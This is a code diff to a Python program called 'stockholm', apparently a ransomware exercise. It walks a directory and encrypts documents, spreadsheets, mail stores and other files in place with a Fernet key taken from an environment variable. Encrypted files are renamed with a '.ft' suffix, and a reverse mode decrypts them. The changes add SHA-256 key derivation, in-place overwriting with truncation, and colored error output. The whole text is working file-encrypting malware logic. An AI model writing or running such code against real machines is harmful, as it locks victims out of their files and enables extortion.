@@ -3,6 +3,8 @@
 from cryptography.fernet import Fernet
 from colorama import Fore
 import argparse
+import hashlib
+import base64
 import os
 
 target_file_extensions = [".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pst", ".ost", ".msg", ".eml", ".txt", \
@@ -20,17 +22,20 @@ def parse_input():
 
     if args.reverse:
         if len(args.reverse) < 16:
-            print("Error: The key must be at least 16 characters long.")
+            print(Fore.RED + "Error: The key must be at least 16 characters long." + Fore.RESET)
             exit(1)
     else:
         stockholm_key = os.getenv('STOCKHOLM_KEY')
         if not stockholm_key or len(stockholm_key) < 16:
-            print("Error: The STOCKHOLM_KEY environment variable must be defined and at least 16 characters long.")
-            print(stockholm_key)
-            print(len(stockholm_key))
+            print(Fore.RED + "Error: The STOCKHOLM_KEY environment variable must be defined and at least 16 characters long." + Fore.RESET)
             exit(1)
 
     return args
+
+def generate_fernet_key(base_key):
+    # Hash the base key to ensure it has the correct size for Fernet
+    hashed_key = hashlib.sha256(base_key.encode()).digest()
+    return base64.urlsafe_b64encode(hashed_key)
 
 
 def check_dir(silent):
@@ -38,7 +43,7 @@ def check_dir(silent):
         if not silent:
             print(f"Found directory '{directory_path}':")
     else:
-        print(f"{Fore.RED}Directory '{directory_path}' does not exist.{Fore.RESET}")
+        print(f"Error: {Fore.RED}Directory '{directory_path}' does not exist.{Fore.RESET}")
         exit(0)
 
 
@@ -54,9 +59,9 @@ def check_permissions(file_path, silent):
     return can_read == False or can_write == False
 
 
-def decrypt(key, silent):
+def decrypt(base_key, silent):
     check_dir(silent)
-    fernet = Fernet(key)
+    fernet = Fernet(generate_fernet_key(base_key))
     for root, dirs, files in os.walk(directory_path):
         for file_name in files:
             file_path = root+'/'+file_name
@@ -71,12 +76,15 @@ def decrypt(key, silent):
             original_name = base
 
             try:
-                with open(file_path, 'rb') as encrypted_file:
-                    encrypted_data = encrypted_file.read()
-                decrypted_data = fernet.decrypt(encrypted_data)
-                with open(file_path, 'wb') as decrypted_file:
-                    decrypted_file.write(decrypted_data)
-                os.rename(file_path, original_name)
+                with open(file_path, 'r+b') as file:
+                    encrypted_data = file.read()
+                    decrypted_data = fernet.decrypt(encrypted_data)
+
+                    file.seek(0)
+                    file.write(decrypted_data)
+                    file.truncate()
+                    os.rename(file_path, original_name)
+
                 if not silent:
                     print(Fore.GREEN + "Decrypted file: " + Fore.WHITE + original_name + Fore.RESET)
 
@@ -89,25 +97,26 @@ def decrypt(key, silent):
 
 def encrypt(silent):
     check_dir(silent)
-    key = os.getenv('STOCKHOLM_KEY')
-    fernet = Fernet(key)
-    for root, dirs, files in os.walk(directory_path):
+    base_key = os.getenv('STOCKHOLM_KEY')
+    fernet = Fernet(generate_fernet_key(base_key))
+    for root, _, files in os.walk(directory_path):
         for file_name in files:
             file_path = root+'/'+file_name
             if check_permissions(file_path, silent):
                 continue
 
-            base, ext = os.path.splitext(file_path)
+            _, ext = os.path.splitext(file_path)
             if ext in target_file_extensions:
                 encrypted_file_path = file_path + ".ft"
-                print(f"File: {root}/{file_path}")
 
-                with open(file_path, 'rb') as file:
+                with open(file_path, 'r+b') as file:
                     original_data = file.read()
-                encrypted_data = fernet.encrypt(original_data)
-                with open(file_path, 'wb') as encrypted_file:
-                    encrypted_file.write(encrypted_data)
-                os.rename(file_path, encrypted_file_path)
+                    encrypted_data = fernet.encrypt(original_data)
+
+                    file.seek(0)
+                    file.write(encrypted_data)
+                    file.truncate()
+                    os.rename(file_path, encrypted_file_path)
 
                 if not silent:
                     print(Fore.GREEN + "Encrypted file: " + Fore.WHITE + file_name + Fore.RESET)
